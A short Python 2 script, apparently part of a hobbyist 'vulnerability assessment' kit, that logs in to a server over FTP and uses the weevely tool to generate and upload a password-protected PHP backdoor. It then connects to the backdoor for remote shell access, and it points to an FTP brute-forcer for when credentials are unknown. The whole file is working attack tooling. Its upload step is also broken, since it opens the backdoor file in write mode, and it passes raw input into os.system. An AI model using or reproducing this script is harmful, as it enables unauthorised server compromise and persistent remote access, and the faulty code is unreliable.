#!/usr/bin/python
__author__ = 'b0xr00ter'
import ftplib
import os

def phpbd(uname,psswd):
    host = raw_input('Enter the host address: ')
    ftp = ftplib.FTP(host)
    ftp.login(uname,psswd)
    print 'Lets create a php backdoor '
    password = raw_input('Enter the password to conenct to backdoor: ')
    os.system('weevely generate '+ password +' backdoor.php')
    try:
        print '[*] Uploading backdoor.php with pass: '+ password
        ftp.storlines("STOR backdoor.php",open('backdoor.php' ,'w') )
        print '[+] File Uploaded Successfully '
    except:
        print '[-] Error uploading file'
        exit(1)


    print '[*] Connecting through the reverse shell Please wait ..'
    address = raw_input('Please Enter the url where the shell is located : ')
    password = raw_input('Double check the password please : ')
    adress = 'http://' + address + '/' + 'backdoor.php'
    os.system('weevely '+ adress + ' ' + password)



def main():
    print '''
            **************************************************************
             Welcome to PHP Backdoor of Python Vulnerability Assesment
                                            by Shivam Mehta
            **************************************************************'''
    print 'Use this modules if u know the ftp username and password otherwise use the FTP bruteforcer module first ^_^ '
    uname = raw_input('Enter the FTP username : ')
    psswd = raw_input('Enter the FTP password : ')
    phpbd(uname,psswd)



if __name__ == '__main__':
    main()